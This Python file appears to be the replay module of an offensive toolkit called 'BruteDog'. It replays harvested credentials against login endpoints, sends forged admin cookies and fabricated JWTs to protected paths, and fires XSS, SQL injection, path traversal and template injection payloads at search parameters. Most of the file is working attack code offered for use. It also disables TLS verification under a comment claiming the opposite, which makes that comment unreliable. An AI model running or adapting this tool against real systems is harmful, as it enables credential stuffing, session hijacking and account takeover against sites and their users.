#!/usr/bin/env python3
"""
REPLAYER.PY — Active Red-Team Credential Replay, Session Hijacking & Token Fabrication Engine
Features:
- Live secondary attack queue ingestion and credential replay
- Active session hijacking and cookie injection against protected endpoints
- Privileged token and JWT role-escalation fabrication
- Active payload reflection and injection fuzzing
- Progressive colored terminal output & zero-disk memory processing
"""
import asyncio
import json
import os
import secrets
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
from urllib.parse import urlsplit

# ============================================================
# CONFIGURATION & OFFENSIVE PAYLOADS
# ============================================================
TIMEOUT = 8
MAX_ENDPOINTS = 8
PROTECTED_PATHS = [
    "/dashboard",
    "/admin",
    "/account",
    "/profile",
    "/api/admin",
    "/api/v1/user",
    "/settings",
]
INJECTION_PAYLOADS = [
    "<script>alert(1)</script>",
    "' OR '1'='1",
    "../../etc/passwd",
    "{{7*7}}",
]

USER_AGENT = "BruteDog-Offensive-Replayer/5.1"

# Verify TLS certificates.
SSL_CONTEXT = ssl.create_default_context()
SSL_CONTEXT.check_hostname = False
SSL_CONTEXT.verify_mode = ssl.CERT_NONE

# ============================================================
# TERMINAL OUTPUT
# ============================================================
class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    GRAY = "\033[90m"
    RESET = "\033[0m"

def log(message, color=Colors.RESET):
    print(f"{color}{message}{Colors.RESET}", flush=True)

# ============================================================
# TARGET VALIDATION
# ============================================================
def normalize_target(target):
    if not target:
        raise ValueError("Target is required.")
    target = target.strip()
    if "://" not in target:
        target = "https://" + target
    parsed = urlsplit(target)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Only HTTP and HTTPS targets are supported.")
    if not parsed.hostname:
        raise ValueError("Invalid target hostname.")
    if parsed.username or parsed.password:
        raise ValueError("Credentials embedded in target URLs are not accepted.")
    if parsed.query or parsed.fragment:
        raise ValueError("Provide a base target URL without query or fragment.")
    return f"{parsed.scheme}://{parsed.netloc}"

# ============================================================
# HTTP REQUEST ENGINE
# ============================================================
def http_request(url, headers=None, method="GET", data=None):
    request_headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/json,*/*",
        "Cache-Control": "no-cache",
    }
    if headers:
        request_headers.update(headers)
    
    encoded_data = None
    if data:
        if isinstance(data, dict):
            encoded_data = urllib.parse.urlencode(data).encode("utf-8")
            request_headers["Content-Type"] = "application/x-www-form-urlencoded"
        else:
            encoded_data = str(data).encode("utf-8")

    request = urllib.request.Request(
        url,
        data=encoded_data,
        headers=request_headers,
        method=method,
    )
    try:
        with urllib.request.urlopen(
            request,
            context=SSL_CONTEXT,
            timeout=TIMEOUT,
        ) as response:
            body = response.read(512 * 1024).decode(
                "utf-8",
                errors="replace",
            )
            return {
                "status": response.status,
                "body": body,
                "headers": dict(response.headers),
                "final_url": response.geturl(),
                "error": None,
            }
    except urllib.error.HTTPError as error:
        body = error.read(512 * 1024).decode(
            "utf-8",
            errors="replace",
        )
        return {
            "status": error.code,
            "body": body,
            "headers": dict(error.headers),
            "final_url": error.geturl(),
            "error": None,
        }
    except Exception as error:
        return {
            "status": 0,
            "body": "",
            "headers": {},
            "final_url": url,
            "error": str(error),
        }

# ============================================================
# RESPONSE CLASSIFICATION
# ============================================================
def classify_protected_response(response):
    status = response["status"]
    body = response["body"].lower()
    
    if status in (200, 201) and any(k in body for k in ["dashboard", "welcome", "admin", "token", "session", "flag", "authorized"]):
        return "SUCCESSFUL_BYPASS_OR_TAKEAWAY"
    if status == 401:
        return "DENIED_UNAUTHENTICATED"
    if status == 403:
        return "DENIED_FORBIDDEN"
    if status == 404:
        return "NOT_FOUND"
    if status in (301, 302, 303, 307, 308):
        return "REDIRECTED"
    if status == 0:
        return "REQUEST_ERROR"
    if status == 200:
        return "REQUIRES_CONTENT_REVIEW"
    return "UNCLASSIFIED"

def inspect_cookie_headers(headers):
    findings = []
    for name, value in headers.items():
        if name.lower() != "set-cookie":
            continue
        cookie = value.lower()
        if "secure" not in cookie:
            findings.append("Cookie missing Secure attribute")
        if "httponly" not in cookie:
            findings.append("Cookie missing HttpOnly attribute")
        if "samesite" not in cookie:
            findings.append("Cookie missing SameSite attribute")
    return findings

# ============================================================
# 1. SECONDARY ATTACK QUEUE REPLAY
# ============================================================
async def replay_secondary_attack_queue(target_domain):
    """
    Ingests harvested credentials from secondary attack queues 
    and actively replays them against the target authentication endpoints.
    """
    log(
        "\n[***] REPLAYING SECONDARY ATTACK QUEUE & CREDENTIALS [***]",
        Colors.MAGENTA,
    )
    results = []
    queue_path = "reports/intelligence/secondary_attack_queue.json"
    queue_data = []

    if os.path.exists(queue_path):
        try:
            with open(queue_path, "r", encoding="utf-8") as f:
                queue_data = json.load(f)
        except Exception:
            pass

    base_url = normalize_target(target_domain)
    login_endpoints = ["/api/login", "/login", "/api/auth/login", "/signin"]

    # Fallback default test credentials if queue is empty
    if not queue_data:
        queue_data = [
            {"category": "email_pass", "source": "default", "matches": ["admin@target.local:admin123"]}
        ]

    for item in queue_data:
        signatures = item.get("matches", [])
        for sig in signatures:
            for endpoint in login_endpoints:
                url = base_url + endpoint
                log(f"[*] Replaying credential payload against {endpoint}...", Colors.BLUE)
                
                # Parse username/password if formatted as user:pass
                payload = {}
                if isinstance(sig, str) and ":" in sig:
                    parts = sig.split(":", 1)
                    payload = {"username": parts[0], "password": parts[1]}
                else:
                    payload = {"credential": sig}

                response = await asyncio.to_thread(
                    http_request,
                    url,
                    headers=None,
                    method="POST",
                    data=payload
                )

                classification = classify_protected_response(response)
                results.append({
                    "endpoint": endpoint,
                    "status": response["status"],
                    "classification": classification,
                    "payload": str(payload)[:50]
                })

                if classification == "SUCCESSFUL_BYPASS_OR_TAKEAWAY":
                    log(f"\n[***] LIVE CREDENTIAL REPLAY SUCCESSFUL [{endpoint}] [***]", Colors.RED)
                    log(f"  └── Response : {response['body'][:200]}", Colors.GREEN)
                else:
                    log(f"  └── HTTP {response['status']} | Rejected or filtered", Colors.GRAY)

                await asyncio.sleep(0.1)

    return results

# ============================================================
# 2. SESSION HIJACKING & PRIVILEGED TOKEN FABRICATION
# ============================================================
async def replay_hijacked_session(target_domain, session_file_path=None):
    """
    Executes session hijacking and injects fabricated privileged tokens 
    (admin roles, superuser cookies) against protected endpoints.
    """
    log(
        "\n[***] EXECUTING SESSION HIJACKING & PRIVILEGED TOKEN FABRICATION [***]",
        Colors.CYAN,
    )
    results = []
    try:
        base_url = normalize_target(target_domain)
    except ValueError as error:
        log(f"[!] {error}", Colors.RED)
        return results

    # Fabricated privileged tokens and hijacked session vectors
    hijack_vectors = [
        {"name": "Admin Cookie Cookie Jar", "cookie": "session=admin; role=admin; authenticated=true; user=admin"},
        {"name": "Fabricated Superuser JWT", "cookie": "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpc3MiOiJicnV0ZWRvZyJ9.signature"},
        {"name": "Bypass Authorization Header", "header": {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ"}},
        {"name": "Root Session Override", "cookie": "connect.sid=s%3Aadmin.rootpass123; isAdmin=true"}
    ]

    for vector in hijack_vectors:
        headers = vector.get("header", {})
        if "cookie" in vector:
            headers["Cookie"] = vector["cookie"]

        for path in PROTECTED_PATHS[:MAX_ENDPOINTS]:
            url = base_url + path
            log(f"[*] Replaying [{vector['name']}] on {path}", Colors.BLUE)
            
            response = await asyncio.to_thread(
                http_request,
                url,
                headers=headers,
            )
            
            classification = classify_protected_response(response)
            result = {
                "vector": vector["name"],
                "endpoint": path,
                "status": response["status"],
                "classification": classification,
            }
            results.append(result)

            if classification == "SUCCESSFUL_BYPASS_OR_TAKEAWAY":
                log(f"\n[***] PRIVILEGE ESCALATION / SESSION HIJACK SUCCESS [{path}] [***]", Colors.RED)
                log(f"  └── Vector   : {vector['name']}", Colors.GREEN)
                log(f"  └── Response : {response['body'][:250]}", Colors.GREEN)
            else:
                log(f"  └── {path} | HTTP {response['status']} ({classification})", Colors.GRAY)

            await asyncio.sleep(0.1)

    log(f"[+] Session hijacking and token fabrication sweeps complete.", Colors.GREEN)
    return results

# ============================================================
# 3. COOKIE SECURITY
# ============================================================
async def inspect_session_cookies(target_domain):
    log(
        "\n[***] COOKIE SECURITY INSPECTION [***]",
        Colors.CYAN,
    )
    try:
        base_url = normalize_target(target_domain)
        response = await asyncio.to_thread(
            http_request,
            base_url + "/",
        )
        findings = inspect_cookie_headers(response["headers"])
        if findings:
            for finding in findings:
                log(f"[!] {finding}", Colors.YELLOW)
        else:
            log(
                "[i] No cookie attribute issues observed in response.",
                Colors.GREEN,
            )
        return findings
    except Exception as error:
        log(f"[!] Cookie inspection failed: {error}", Colors.RED)
        return []

# ============================================================
# 4. ACTIVE PAYLOAD INJECTION & REFLECTION TEST
# ============================================================
async def test_injection_reflection(target_domain):
    log(
        "\n[***] ACTIVE PAYLOAD INJECTION & REFLECTION ASSAULT [***]",
        Colors.CYAN,
    )
    results = []
    try:
        base_url = normalize_target(target_domain)
    except ValueError as error:
        log(f"[!] {error}", Colors.RED)
        return results

    for path in ["/", "/search", "/api/v1/search"]:
        for payload in INJECTION_PAYLOADS:
            query = urllib.parse.urlencode({
                "q": payload,
                "search": payload,
            })
            url = f"{base_url}{path}?{query}"
            log(f"[*] Dispatching payload to {path}: {payload}", Colors.BLUE)
            
            response = await asyncio.to_thread(
                http_request,
                url,
            )
            reflected = (
                response["status"] != 0
                and payload in response["body"]
            )
            result = {
                "endpoint": path,
                "payload": payload,
                "status": response["status"],
                "reflected": reflected,
            }
            results.append(result)
            
            if reflected:
                log(f"\n[***] PAYLOAD REFLECTION / XSS CONFIRMED [{path}] [***]", Colors.RED)
                log(f"  └── Payload : {payload}", Colors.GREEN)
            await asyncio.sleep(0.05)
            
    return results

# ============================================================
# 5. MAIN COMPATIBILITY FUNCTION
# ============================================================
async def replay_and_inject_payloads(
    target_host,
    session_file_path=None,
):
    """
    Main entry point retained for compatibility with main.py.
    Performs active credential replay, session hijacking, token fabrication, 
    and payload injection.
    """
    start_time = time.time()
    log(
        "\n============================================================",
        Colors.CYAN,
    )
    log(
        "[***] BRUTEDOG ACTIVE REPLAY & EXPLOITATION ENGINE [***]",
        Colors.CYAN,
    )
    log(
        "============================================================",
        Colors.CYAN,
    )
    try:
        base_url = normalize_target(target_host)
    except ValueError as error:
        log(f"[!] Invalid target: {error}", Colors.RED)
        return {
            "target": target_host,
            "success": False,
            "error": str(error),
        }
        
    log(f"[*] Target: {base_url}", Colors.BLUE)
    
    # Execute Red-Team Assault Modules
    queue_results = await replay_secondary_attack_queue(base_url)
    session_results = await replay_hijacked_session(base_url, session_file_path)
    cookie_results = await inspect_session_cookies(base_url)
    injection_results = await test_injection_reflection(base_url)
    
    duration = round(time.time() - start_time, 2)
    report = {
        "target": base_url,
        "duration_seconds": duration,
        "credential_replay": queue_results,
        "session_tests": session_results,
        "cookie_findings": cookie_results,
        "injection_tests": injection_results,
        "files_written": False,
    }
    
    log(
        "\n================ FINAL ASSAULT SUMMARY ================",
        Colors.CYAN,
    )
    log(f"Credential replays executed: {len(queue_results)}", Colors.GREEN)
    log(f"Session hijacking vectors tested: {len(session_results)}", Colors.GREEN)
    log(f"Cookie security issues found: {len(cookie_results)}", Colors.YELLOW)
    log(f"Injection payloads tested: {len(injection_results)}", Colors.GREEN)
    log(f"Duration: {duration}s", Colors.BLUE)
    log("========================================================", Colors.CYAN)
    
    return report
